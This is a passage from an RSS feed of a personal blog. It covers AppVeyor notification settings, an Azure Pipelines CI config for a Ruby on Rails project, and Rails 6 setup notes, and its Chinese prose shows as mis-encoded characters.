&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;provider&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;HipChat&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;auth_token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;secure&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;RbOnSMSFKYzxzFRrxM1+XA==&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;room&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;ProjectA&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;template&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;{message}, {commitId}, ...&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# Slack&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;provider&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;Slack&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;incoming_webhook&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;http://incoming-webhook-url&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# ...or using auth token&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;provider&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;Slack&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;auth_token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;secure&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;kBl9BlxvRMr9liHmnBs14A==&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;channel&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;development&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;template&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;{message}, {commitId}, ...&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# Campfire&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;provider&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;Campfire&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;account&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;appveyor&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;auth_token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;secure&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;RifLRG8Vfyol+sNhj9u2JA==&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;room&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;ProjectA&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;template&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;{message}, {commitId}, ...&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# Webhook&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;provider&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;Webhook&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;http://www.myhook2.com&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;User-Agent&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;myapp 1.0&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;Authorization&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;secure&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;GhD+5xhLz/tkYY6AO3fcfQ==&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;on_build_success&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;on_build_failure&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;on_build_status_changed&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Azure Pipelines</title>
        <link>https://sdttttt.github.io/p/azure-pipelines/</link>
        <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
        
        <guid>https://sdttttt.github.io/p/azure-pipelines/</guid>
        <description>&lt;p&gt;Azure Pipelinesæ˜¯ä¸€ç§äº‘æœåŠ¡ï¼Œå¯ç”¨äºè‡ªåŠ¨æ„å»ºå’Œæµ‹è¯•æ‚¨çš„ä»£ç é¡¹ç›®å¹¶å°†å…¶æä¾›ç»™å…¶ä»–ç”¨æˆ·ã€‚å®ƒå‡ ä¹é€‚ç”¨äºä»»ä½•è¯­è¨€æˆ–é¡¹ç›®ç±»å‹ã€‚&lt;/p&gt;
&lt;p&gt;Azure Pipelineså°†æŒç»­é›†æˆï¼ˆCIï¼‰å’ŒæŒç»­äº¤ä»˜ï¼ˆCDï¼‰ç›¸ç»“åˆï¼Œä»¥æŒç»­ä¸æ–­åœ°æµ‹è¯•å’Œæ„å»ºæ‚¨çš„ä»£ç å¹¶å°†å…¶äº¤ä»˜ç»™ä»»ä½•ç›®æ ‡ã€‚&lt;/p&gt;
&lt;p&gt;Azure Pipelines æ”¯æŒéå¸¸å¤šçš„è¯­è¨€ã€‚&lt;/p&gt;
&lt;h4 id=&#34;price&#34;&gt;Price&lt;/h4&gt;
&lt;p&gt;å¦‚æœä½¿ç”¨å…¬å…±é¡¹ç›®ï¼Œåˆ™Azure Pipelinesæ˜¯å…è´¹çš„ã€‚å¦‚æœæ‚¨ä½¿ç”¨ç§äººé¡¹ç›®ï¼Œåˆ™æ¯æœˆå¯ä»¥å…è´¹è¿è¡Œå¤šè¾¾1800åˆ†é’Ÿï¼ˆ30å°æ—¶ï¼‰çš„ç®¡é“ä½œä¸šã€‚äº†è§£æœ‰å…³åŸºäºå¹¶è¡Œä½œä¸šå®šä»·çš„æ›´å¤šä¿¡æ¯ã€‚&lt;/p&gt;
&lt;p&gt;æ˜¯ä¸æ˜¯éå¸¸çš„æ£’å‘¢ o(&lt;em&gt;////â–½////&lt;/em&gt;)q&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;è¯·éµå¾ªä»¥ä¸‹åŸºæœ¬æ­¥éª¤ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;é…ç½®Azure Pipelinesä»¥ä½¿ç”¨æ‚¨çš„Gitå­˜å‚¨åº“ã€‚&lt;/li&gt;
&lt;li&gt;ç¼–è¾‘azure-pipelines.ymlæ–‡ä»¶ä»¥å®šä¹‰æ„å»ºã€‚&lt;/li&gt;
&lt;li&gt;å°†æ‚¨çš„ä»£ç æ¨é€åˆ°ç‰ˆæœ¬æ§åˆ¶å­˜å‚¨åº“ã€‚æ­¤æ“ä½œå°†å¯åŠ¨é»˜è®¤è§¦å‘å™¨ä»¥æ„å»ºå’Œéƒ¨ç½²ï¼Œç„¶åç›‘è§†ç»“æœã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;ruby&#34;&gt;Ruby&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span class=&#34;c&#34;&gt;# Ruby&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# Package your Ruby project.&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# Add steps that install rails, analyze code, save build artifacts, deploy, and more:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# https://docs.microsoft.com/azure/devops/pipelines/languages/ruby&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;trigger&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;branches&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# åªæœ‰ä»¥ä¸‹åˆ†æ”¯æäº¤æ‰ä¼šè§¦å‘CICD&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;master&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;sdtttttt&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;CICD&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;depend*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;paths&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# åªæœ‰ä»¥ä¸‹æ–‡ä»¶æäº¤æ—¶ä¸è§¦å‘CICD&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;exclude&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;README.md&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;appveyor.yml&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;pool&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;vmImage&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ubuntu-18.04&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;steps&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;task&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;UseRubyVersion@0&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;inputs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# å¤©æ€çš„ï¼Œå¾®è½¯æä¾›çš„Ubuntu é•œåƒå·²ç»ä¸æ”¯æŒ Ruby2.6.3&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;versionSpec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;gt;= 2.6.3&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# Rails å†…ç½®æ•°æ®åº“ SQLite3 éœ€è¦ä¾èµ–ä»¥ä¸‹å·¥å…·&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;sudo apt-get -yqq install libsqlite3-dev libpq-dev&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;displayName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;install sqlite3&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;|
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;    gem install bundler
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;    bundle install --retry=3 --jobs=4
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;  displayName: &amp;#39;bundle install&amp;#39;
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;- script: bundle exec rake
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;  displayName: &amp;#39;bundle exec rake&amp;#39;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Rails Development</title>
        <link>https://sdttttt.github.io/p/rails-development/</link>
        <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
        
        <guid>https://sdttttt.github.io/p/rails-development/</guid>
        <description>&lt;h3 id=&#34;webpacker&#34;&gt;Webpacker&lt;/h3&gt;
&lt;p&gt;Rails 6ç‰ˆæœ¬å¼€å§‹ä¾èµ–Webpackerï¼Œåœ¨è¿è¡Œä¹‹å‰å¿…é¡»å…ˆå®‰è£…Webpackerè¿™ç©æ„ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;rails webpacker:install
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¦‚æœéœ€è¦å®‰è£…å‰ç«¯æ¡†æ¶ï¼Œè¯·ä½¿ç”¨yarnæ¥å®‰è£…ï¼Œè¿™æ ·éƒ¨ç½²çš„æ—¶å€™èƒ½äº«å—åˆ°webpackeræ‰“åŒ…ä¾¿åˆ©ã€‚&lt;/p&gt;
&lt;h3 id=&#34;production&#34;&gt;production&lt;/h3&gt;
&lt;p&gt;Rails 6 å¯åŠ¨æ—¶éœ€è¦ä¸€ä¸²Keyä½œä¸ºåŠ å¯†çš„saltï¼Œkeyä¸èƒ½éšæ„ç”Ÿæˆã€‚
ç”Ÿæˆkeyæ—¶ï¼Œè¯·åˆ é™¤configä¸‹çš„credentials.enc.yml å’Œ master.key æ–‡ä»¶ã€‚
ç„¶åè¿è¡Œ&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;rails credentials:edit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åRailsè®¿é—®é™æ€èµ„æºï¼Œéœ€è¦ä½¿ç”¨webpackeræ‰“åŒ…ç¼–è¯‘åçš„èµ„äº§ã€‚
è¿è¡Œ&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;rails assets:precompile
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Rails 6 åœ¨ç”Ÿäº§ç¯å¢ƒä¸‹è®¤ä¸ºä½ ä½¿ç”¨ Apache å’Œ Nginx ç¼“å­˜ç¼–è¯‘åçš„é™æ€èµ„äº§ã€‚å¦‚æœä½ ä¸ä½¿ç”¨ä»–ä»¬ï¼Œéœ€è¦&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# config/environments/production.rb&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;config&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;public_file_server&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;enabled&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kp&#34;&gt;true&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è®°ä½ï¼Œæ‰“åŒ…ä¹‹åçš„jsä»¥åŠcssç»Ÿä¸€å«application.js/css åœ¨viewé¡µé¢å¼•ç”¨æ—¶éœ€è¦å¼•ç”¨applicationè¿™ä¸ªåå­—ã€‚å…¶ä»–çš„ä¼šæŠ¥é”™&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Rails ENV</title>
        <link>https://sdttttt.github.io/p/rails-env/</link>
        <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
        
        <guid>https://sdttttt.github.io/p/rails-env/</guid>
        <description>&lt;h1 id=&#34;rails-env&#34;&gt;Rails ENV&lt;/h1&gt;
&lt;p&gt;ç¯å¢ƒé…ç½®å‚è€ƒ Ruby China ç¤¾åŒºçš„ Wiki&lt;/p&gt;
&lt;h3 id=&#34;windows-10&#34;&gt;Windows 10&lt;/h3&gt;
&lt;p&gt;åœ¨ Windowns 10 çš„ç¯å¢ƒä¸‹å’ŒLinuxä¸Šå·®ä¸å¤šï¼Œä¸è¿‡ä¸éœ€è¦RVM&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;é¦–å…ˆåœ¨Rubyå®˜æ–¹ç½‘ç«™ä¸‹è½½å¥½å®‰è£…åŒ…&lt;/li&gt;
&lt;li&gt;ä¹‹åä½¿ç”¨RubyChinaæä¾›çš„Sourceæ›¿æ¢Gemçš„Source&lt;/li&gt;
&lt;li&gt;ä¹‹åä½¿ç”¨Gemä¸‹è½½ Bundler å’Œ Rails&lt;/li&gt;
&lt;li&gt;åˆ›å»ºRailsé¡¹ç›®è¿è¡Œå³å¯&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æœ‰ä¸€ä¸ªè½¯ä»¶å«åš &lt;!-- raw HTML omitted --&gt;RailsInstaller&lt;!-- raw HTML omitted --&gt; å¯ä»¥ç›´æ¥å¸®ä½ çœä¸‹1å’Œ3æ­¥ä¹Ÿå°±æ˜¯ç›´æ¥å¸®ä½ å®‰è£…å¥½äº†Rubyå’ŒRailsè¿˜æœ‰Gemï¼Œbundlerã€‚
ä½†æ˜¯ğŸ™…æˆ‘ç›®å‰ä½¿ç”¨çš„Railsinstalleræœ‰ç‚¹é—®é¢˜ã€‚ä»–çš„Rubyç‰ˆæœ¬æ˜¯2.3ï¼Œrailsç‰ˆæœ¬æ˜¯5ï¼Œrails5ä¾èµ–çš„æ˜¯ &amp;gt;= 2.4ç‰ˆæœ¬çš„rubyï¼Œè¿™å°±æœ‰é—®é¢˜äº†ã€‚æˆ‘ä¹Ÿæ²¡æ¥ç€ç”¨è¿™ä¸ªè½¯ä»¶äº†ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨rails6ä¸­åŠ å…¥äº†&lt;!-- raw HTML omitted --&gt;Webpacker&lt;!-- raw HTML omitted --&gt;çš„æ‰“åŒ…å·¥å…·ï¼Œè¿è¡Œä¹‹å‰éœ€è¦å…ˆå®‰è£…webpackerä¸ç„¶ä¼šæŠ¥é”™ã€‚ &lt;!-- raw HTML omitted --&gt;$ rails webpacker:install&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
